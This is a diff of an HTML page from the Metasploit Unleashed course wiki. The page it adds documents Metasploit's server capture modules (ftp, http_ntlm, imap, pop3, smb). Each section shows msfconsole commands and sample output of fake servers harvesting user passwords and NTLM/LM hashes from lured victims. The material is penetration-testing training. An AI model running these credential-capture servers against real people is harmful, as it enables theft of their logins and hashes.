@@ -2,7 +2,7 @@
 		<!DOCTYPE html>
 		<html xmlns="" xml:lang="en" lang="en" dir="ltr">
 		<head>
-			<title>Metasploit Unleashed</title>
+			<title>Server Capture Auxiliary Modules - Metasploit Unleashed</title>
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/reset.css" />
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/style.css" />
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/main.css" />
@@ -25,10 +25,10 @@
 						
 						<div id="controls">
 									<ul>
-			<li id="ca-nstab-main" class="selected"><a href="Port_Scanners" title="View the content page [c]" accesskey="c">Page</a></li>
-			<li id="ca-talk" class="new"><a href="http://www.offensive-security.com/w/index.php?title=Talk:Main_Page&amp;action=edit&amp;redlink=1" title="Discussion about the content page [t]" accesskey="t">Discussion</a></li>
-			<li id="ca-viewsource"><a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;action=edit" title="This page is protected.&#10;You can view its source [e]" accesskey="e">View source</a></li>
-			<li id="ca-history"><a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;action=history" title="Past revisions of this page [h]" accesskey="h">History</a></li>
+			<li id="ca-nstab-main" class="selected"><a href="Server_Capture_Auxiliary_Modules" title="View the content page [c]" accesskey="c">Page</a></li>
+			<li id="ca-talk" class="new"><a href="http://www.offensive-security.com/w/index.php?title=Talk:Server_Capture_Auxiliary_Modules&amp;action=edit&amp;redlink=1" title="Discussion about the content page [t]" accesskey="t">Discussion</a></li>
+			<li id="ca-viewsource"><a href="http://www.offensive-security.com/w/index.php?title=Server_Capture_Auxiliary_Modules&amp;action=edit" title="This page is protected.&#10;You can view its source [e]" accesskey="e">View source</a></li>
+			<li id="ca-history"><a href="http://www.offensive-security.com/w/index.php?title=Server_Capture_Auxiliary_Modules&amp;action=history" title="Past revisions of this page [h]" accesskey="h">History</a></li>
 		</ul>
 							
 							<div class="portlet" id="p-personal">
@@ -57,36 +57,414 @@
 						<a id="top"></a>
 						
 						<div id="content">
-							<h1>Metasploit Unleashed</h1>
+							<h1>Server Capture Auxiliary Modules</h1>
 						
 							<div id="siteSub">From Metasploit Unleashed</div>
 							<div id="contentSub"></div>
-																													<div id="jump-to-nav">Jump to: <a href="Port_Scanners#column-one">navigation</a>, <a href="Port_Scanners#searchInput">search</a></div>
+																													<div id="jump-to-nav">Jump to: <a href="Server_Capture_Auxiliary_Modules#column-one">navigation</a>, <a href="Server_Capture_Auxiliary_Modules#searchInput">search</a></div>
 														<!-- start content -->
-							<div id="mw-content-text" lang="en" dir="ltr" class="mw-content-ltr"><p>This free information security training is brought to you in a community effort to promote awareness and raise funds for underprivileged children in East Africa. Through a heart-warming effort by several security professionals, we are proud to present the most complete and in-depth open course about the Metasploit Framework.
+							<div id="mw-content-text" lang="en" dir="ltr" class="mw-content-ltr"><table id="toc" class="toc"><tr><td><div id="toctitle"><h2>Contents</h2></div>
+<ul>
+<li class="toclevel-1 tocsection-1"><a href="Server_Capture_Auxiliary_Modules#ftp"><span class="tocnumber">1</span> <span class="toctext">ftp</span></a></li>
+<li class="toclevel-1 tocsection-2"><a href="Server_Capture_Auxiliary_Modules#http_ntlm"><span class="tocnumber">2</span> <span class="toctext">http_ntlm</span></a></li>
+<li class="toclevel-1 tocsection-3"><a href="Server_Capture_Auxiliary_Modules#imap"><span class="tocnumber">3</span> <span class="toctext">imap</span></a></li>
+<li class="toclevel-1 tocsection-4"><a href="Server_Capture_Auxiliary_Modules#pop3"><span class="tocnumber">4</span> <span class="toctext">pop3</span></a></li>
+<li class="toclevel-1 tocsection-5"><a href="Server_Capture_Auxiliary_Modules#smb"><span class="tocnumber">5</span> <span class="toctext">smb</span></a></li>
+</ul>
+</td></tr></table>
+<p><br />
+</p>
+<h2> <span class="mw-headline" id="ftp"> ftp </span></h2>
+<p>The <b>"ftp"</b> capture module acts as and FTP server in order to capture user credentials.
+<br />
+<br />
+<pre>msf > <span style='color:#13C16A;'>use auxiliary/server/capture/ftp</span>
+msf auxiliary(<span style='color:#ff0000;'>ftp</span>) > <span style='color:#13C16A;'>show options</span>
+
+Module options (auxiliary/server/capture/ftp):
+
+   Name        Current Setting  Required  Description
+   ----        ---------------  --------  -----------
+   SRVHOST     0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
+   SRVPORT     21               yes       The local port to listen on.
+   SSL         false            no        Negotiate SSL for incoming connections
+   SSLVersion  SSL3             no        Specify the version of SSL that should be used (accepted: SSL2, SSL3, TLS1)</pre>
+<br />
+The default settings are suitable for our needs so we just run the module and entice a user to log in to our server. When we have captured the information we need, we kill the job the server is running under.
+<br />
+<br />
+<pre>msf auxiliary(<span style='color:#ff0000;'>ftp</span>) > <span style='color:#13C16A;'>run</span>
+<span style='color:#0000FF;'>[*]</span> Auxiliary module execution completed
+<span style='color:#0000FF;'>[*]</span> Server started.
+msf auxiliary(<span style='color:#ff0000;'>ftp</span>) > 
+<span style='color:#0000FF;'>[*]</span> FTP LOGIN 192.168.1.195:1475 bobsmith / s3cr3t
+<span style='color:#0000FF;'>[*]</span> FTP LOGIN 192.168.1.195:1475 bsmith / s3cr3t
+<span style='color:#0000FF;'>[*]</span> FTP LOGIN 192.168.1.195:1475 bob / s3cr3tp4s
+
+msf auxiliary(<span style='color:#ff0000;'>ftp</span>) > <span style='color:#13C16A;'>jobs -l</span>
+
+Jobs
+====
+
+  Id  Name
+  --  ----
+  1   Auxiliary: server/capture/ftp
+
+msf auxiliary(<span style='color:#ff0000;'>ftp</span>) > <span style='color:#13C16A;'>kill 1</span>
+Stopping job: 1...
+
+<span style='color:#0000FF;'>[*]</span> Server stopped.
+msf auxiliary(<span style='color:#ff0000;'>ftp</span>) ></pre>
+<br />
+</p>
+<h2> <span class="mw-headline" id="http_ntlm"> http_ntlm </span></h2>
+<p>The <b>"http_ntlm"</b> capture module attempts to quietly catch NTLM/LM Challenge hashes over HTTP.
+<br />
+<br />
+<pre>msf > <span style='color:#13C16A;'>use auxiliary/server/capture/http_ntlm</span>
+msf auxiliary(<span style='color:#ff0000;'>http_ntlm</span>) > <span style='color:#13C16A;'>show options</span>
+
+Module options (auxiliary/server/capture/http_ntlm):
+
+   Name        Current Setting  Required  Description
+   ----        ---------------  --------  -----------
+   LOGFILE                      no        The local filename to store the captured hashes
+   PWFILE                       no        The local filename to store the hashes in Cain&amp;Abel format
+   SRVHOST     0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
+   SRVPORT     8080             yes       The local port to listen on.
+   SSL         false            no        Negotiate SSL for incoming connections
+   SSLVersion  SSL3             no        Specify the version of SSL that should be used (accepted: SSL2, SSL3, TLS1)
+   URIPATH                      no        The URI to use for this exploit (default is random)</pre>
+<br />
+This module has a few options available for fine-tuning, including the ability to save any captured hashes in Cain&amp;Abel format. For our setup, we set the LOGFILE value to saves the hashes to a text file, set our SRVPORT value to listen on port 80 and configure the URIPATH to / for added realism.
+<br />
+<br />
+<pre>msf auxiliary(<span style='color:#ff0000;'>http_ntlm</span>) > <span style='color:#13C16A;'>set LOGFILE captured_hashes.txt</span>
+LOGFILE => captured_hashes.txt
+msf auxiliary(<span style='color:#ff0000;'>http_ntlm</span>) > <span style='color:#13C16A;'>set SRVPORT 80</span>
+SRVPORT => 80
+msf auxiliary(<span style='color:#ff0000;'>http_ntlm</span>) > <span style='color:#13C16A;'>set URIPATH /</span>
+URIPATH => /
+msf auxiliary(<span style='color:#ff0000;'>http_ntlm</span>) > <span style='color:#13C16A;'>run</span>
+<span style='color:#0000FF;'>[*]</span> Auxiliary module execution completed
+
+<span style='color:#0000FF;'>[*]</span> Using URL: http://0.0.0.0:80/
+<span style='color:#0000FF;'>[*]</span>  Local IP: http://192.168.1.101:80/
+<span style='color:#0000FF;'>[*]</span> Server started.
+msf auxiliary(<span style='color:#ff0000;'>http_ntlm</span>) > 
+<span style='color:#0000FF;'>[*]</span> Request '/' from 192.168.1.195:1964
+<span style='color:#0000FF;'>[*]</span> Request '/' from 192.168.1.195:1964
+<span style='color:#0000FF;'>[*]</span> Request '/' from 192.168.1.195:1964
+<span style='color:#0000FF;'>[*]</span> 192.168.1.195: V-MAC-XP\Administrator 397ff8a937165f55fdaaa0bc7130b1a22f85252cc731bb25:af44a1131410665e6dd99eea8f16deb3e81ed4ecc4cb7d2b on V-MAC-XP
+
+msf auxiliary(<span style='color:#ff0000;'>http_ntlm</span>) > <span style='color:#13C16A;'>jobs -l</span>
+
+Jobs
+====
+
+  Id  Name
+  --  ----
+  0   Auxiliary: server/capture/http_ntlm
+
+msf auxiliary(<span style='color:#ff0000;'>http_ntlm</span>) > <span style='color:#13C16A;'>kill 0</span>
+Stopping job: 0...
+
+<span style='color:#0000FF;'>[*]</span> Server stopped.
+msf auxiliary(http_ntlm) ></pre>
+<br />
+As shown above, as soon as our victim browses to our server using Internet Explorer, the Administrator hash is collected without any user interaction.
+<br />
+</p><p><br />
+</p>
+<h2> <span class="mw-headline" id="imap"> imap </span></h2>
+<p>The <b>"imap"</b> capture module acts as an IMAP server in order to collect user mail credentials.
+<br />
+<br />
+<pre>msf > use auxiliary/server/capture/imap
+msf auxiliary(imap) > show options
+
+Module options (auxiliary/server/capture/imap):
+
+   Name        Current Setting  Required  Description
+   ----        ---------------  --------  -----------
+   SRVHOST     0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
+   SRVPORT     143              yes       The local port to listen on.
+   SSL         false            no        Negotiate SSL for incoming connections
+   SSLVersion  SSL3             no        Specify the version of SSL that should be used (accepted: SSL2, SSL3, TLS1)</pre>
+<br />
+We don't need to do any extra configuration for this module so we let it run and then convince a user to connect to our server and collect his credentials.
+<br />
+<br />
+<pre>msf auxiliary(<span style='color:#ff0000;'>imap</span>) > <span style='color:#13C16A;'>run
+</span>[*] Auxiliary module execution completed
+
+<span style='color:#0000FF;'>[*]</span> Server started.
+msf auxiliary(<span style='color:#ff0000;'>imap</span>) > 
+<span style='color:#0000FF;'>[*]</span> IMAP LOGIN 192.168.1.195:2067 "victim" / "s3cr3t"
+msf auxiliary(<span style='color:#ff0000;'>imap</span>) > <span style='color:#13C16A;'>jobs -l</span>
+
+Jobs
+====
+
+  Id  Name
+  --  ----
+  0   Auxiliary: server/capture/imap
+
+msf auxiliary(<span style='color:#ff0000;'>imap</span>) > <span style='color:#13C16A;'>kill 0</span>
+Stopping job: 0...
+
+<span style='color:#0000FF;'>[*]</span> Server stopped.
+msf auxiliary(<span style='color:#ff0000;'>imap</span>) ></pre>
+<br />
+</p><p><br />
+</p>
+<h2> <span class="mw-headline" id="pop3"> pop3 </span></h2>
+<p>The <b>"pop3"</b> capture module poses as a POP3 mail server in order to capture user mail credentials.
+<br />
+<br />
+<pre>msf > <span style='color:#13C16A;'>use auxiliary/server/capture/pop3</span>
+msf auxiliary(<span style='color:#ff0000;'>pop3</span>) > <span style='color:#13C16A;'>show options</span>
+
+Module options (auxiliary/server/capture/pop3):
+
+   Name        Current Setting  Required  Description
+   ----        ---------------  --------  -----------
+   SRVHOST     0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
+   SRVPORT     110              yes       The local port to listen on.
+   SSL         false            no        Negotiate SSL for incoming connections
+   SSLVersion  SSL3             no        Specify the version of SSL that should be used (accepted: SSL2, SSL3, TLS1)</pre>
+<br />
+We will leave the settings at their defaults, run the module and then convince the victim to authenticate to our server.
+<br />
+<br />
+<pre>msf auxiliary(<span style='color:#ff0000;'>pop3</span>) > <span style='color:#13C16A;'>run</span>
+<span style='color:#0000FF;'>[*]</span> Auxiliary module execution completed
+
+<span style='color:#0000FF;'>[*]</span> Server started.
+msf auxiliary(<span style='color:#ff0000;'>pop3</span>) > 
+<span style='color:#0000FF;'>[*]</span> POP3 LOGIN 192.168.1.195:2084 victim / s3cr3t
+
+msf auxiliary(<span style='color:#ff0000;'>pop3</span>) > <span style='color:#13C16A;'>jobs -l</span>
+
+Jobs
+====
+
+  Id  Name
+  --  ----
+  1   Auxiliary: server/capture/pop3
+
+msf auxiliary(<span style='color:#ff0000;'>pop3</span>) > <span style='color:#13C16A;'>kill 1</span>
+Stopping job: 1...
+
+<span style='color:#0000FF;'>[*]</span> Server stopped.
+msf auxiliary(<span style='color:#ff0000;'>pop3</span>) ></pre>
+<br />
+</p><p><br />
+</p>
+<h2> <span class="mw-headline" id="smb"> smb </span></h2>
+<p>The <b>"smb"</b> capture module acts as a SMB share to capture user password hashes so they can be later exploited.
+<br />
+<br />
+<pre>msf > <span style='color:#13C16A;'>use auxiliary/server/capture/smb</span>
+msf auxiliary(<span style='color:#ff0000;'>smb</span>) > <span style='color:#13C16A;'>show options</span>
+
+Module options (auxiliary/server/capture/smb):
+
+   Name        Current Setting   Required  Description
+   ----        ---------------   --------  -----------
+   CAINPWFILE                    no        The local filename to store the hashes in Cain&amp;Abel format
+   CHALLENGE   1122334455667788  yes       The 8 byte challenge 
+   JOHNPWFILE                    no        The prefix to the local filename to store the hashes in JOHN format
+   LOGFILE                       no        The local filename to store the captured hashes
+   SRVHOST     0.0.0.0           yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
+   SRVPORT     445               yes       The local port to listen on.
+   SSL         false             no        Negotiate SSL for incoming connections
+   SSLVersion  SSL3              no        Specify the version of SSL that should be used (accepted: SSL2, SSL3, TLS1)</pre>
+<br />
+This module has a number of options available. We will only set the JOHNPWFILE option to save the captures hashes in John the Ripper format, run the module, and convince a user to connect to our "share".
+<br />
+<br />
+<pre>msf auxiliary(<span style='color:#ff0000;'>smb</span>) > <span style='color:#13C16A;'>set JOHNPWFILE /tmp/smbhashes.txt</span>
+JOHNPWFILE => /tmp/smbhashes.txt
+msf auxiliary(<span style='color:#ff0000;'>smb</span>) > <span style='color:#13C16A;'>run</span>
+<span style='color:#0000FF;'>[*]</span> Auxiliary module execution completed
+
+<span style='color:#0000FF;'>[*]</span> Server started.
+msf auxiliary(<span style='color:#ff0000;'>smb</span>) > 
+<span style='color:#0000FF;'>[*]</span> Mon Mar 28 10:21:56 -0600 2011
+NTLMv1 Response Captured from 192.168.1.195:2111 
+V-MAC-XP\Administrator OS:Windows 2002 Service Pack 2 2600 LM:Windows 2002 5.1
+LMHASH:397ff8a937165f55fdaaa0bc7130b1a22f85252cc731bb25 
+NTHASH:af44a1131410665e6dd99eea8f16deb3e81ed4ecc4cb7d2b
+
+
+msf auxiliary(<span style='color:#ff0000;'>smb</span>) > <span style='color:#13C16A;'>jobs -l</span>
+
+Jobs
+====
+
+  Id  Name
+  --  ----
+  2   Auxiliary: server/capture/smb
+
+msf auxiliary(<span style='color:#ff0000;'>smb</span>) > <span style='color:#13C16A;'>kill 2</span>
+Stopping job: 2...
+
+<span style='color:#0000FF;'>[*]</span> Server stopped.
+msf auxiliary(<span style='color:#ff0000;'>smb</span>) ></pre>
 <br />
 <br />
 </p>
-<div class="center"><div class="floatnone"><a href="File:Msfu_logo_3.png" class="image"><img alt="Msfu logo 3.png" src="http://www.offensive-security.com/w/images/f/f6/Msfu_logo_3.png" width="632" height="319" /></a></div></div>
+<hr />
 <p><br />
-<br />
-This is a free online course and if you enjoy it and find it useful, we ask that you make a donation to the HFC (Hackers For Charity), $9.00 will feed a child for a month, so any contribution is welcome. We hope you enjoy this course as much as we enjoyed making it.
-<br />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</p>
+<div class="Total1"><a href="http://www.offensive-security.com/w/index.php?title=Module_Reference&amp;action=edit&amp;redlink=1" class="new" title="Module Reference (page does not exist)">Module Reference</a> &gt; <a href="http://www.offensive-security.com/w/index.php?title=Auxiliary_Modules&amp;action=edit&amp;redlink=1" class="new" title="Auxiliary Modules (page does not exist)">Auxiliary Modules</a> &gt; <a href="http://www.offensive-security.com/w/index.php?title=Server_Modules&amp;action=edit&amp;redlink=1" class="new" title="Server Modules (page does not exist)">Server Modules</a> &gt; Server Capture Auxiliary Modules</div>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</p>
+<div class="Total2"><a href="http://www.offensive-security.com/w/index.php?title=Server_Capture_Modules&amp;action=edit&amp;redlink=1" class="new" title="Server Capture Modules (page does not exist)">Server Capture Modules</a></div>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 </p>
 <!-- 
 NewPP limit report
-Preprocessor visited node count: 6/1000000
-Preprocessor generated node count: 20/1000000
-Post‐expand include size: 0/2097152 bytes
+Preprocessor visited node count: 617/1000000
+Preprocessor generated node count: 2857/1000000
+Post‐expand include size: 5124/2097152 bytes
 Template argument size: 0/2097152 bytes
-Highest expansion depth: 2/40
+Highest expansion depth: 3/40
 Expensive parser function count: 0/100
 -->
 
-<!-- Saved in parser cache with key MSFU_Mediawiki-msfum_:pcache:idhash:285-0!*!*!*!*!2!* and timestamp 20131123153816 -->
+<!-- Saved in parser cache with key MSFU_Mediawiki-msfum_:pcache:idhash:257-0!*!0!!en!*!* and timestamp 20131124112743 -->
 </div><div class="printfooter">
-Retrieved from "<a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;oldid=1597">http://www.offensive-security.com/w/index.php?title=Main_Page&amp;oldid=1597</a>"</div>
-							<div id='catlinks' class='catlinks catlinks-allhidden'></div>							<!-- end content -->
+Retrieved from "<a href="http://www.offensive-security.com/w/index.php?title=Server_Capture_Auxiliary_Modules&amp;oldid=1281">http://www.offensive-security.com/w/index.php?title=Server_Capture_Auxiliary_Modules&amp;oldid=1281</a>"</div>
+							<div id='catlinks' class='catlinks'><div id="mw-normal-catlinks" class="mw-normal-catlinks"><a href="Special:Categories" title="Special:Categories">Category</a>: <ul><li><a href="http://www.offensive-security.com/w/index.php?title=Category:Server_Modules&amp;action=edit&amp;redlink=1" class="new" title="Category:Server Modules (page does not exist)">Server Modules</a></li></ul></div></div>							<!-- end content -->
 													</div>
 						
 					</div>
@@ -521,4 +899,4 @@ document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.
 <script type="text/javascript">
 var pageTracker = _gat._getTracker("UA-1981501-1");
 pageTracker._trackPageview();
-</script><!-- Served in 0.151 secs. --></body></html>
+</script><!-- Served in 0.184 secs. --></body></html>
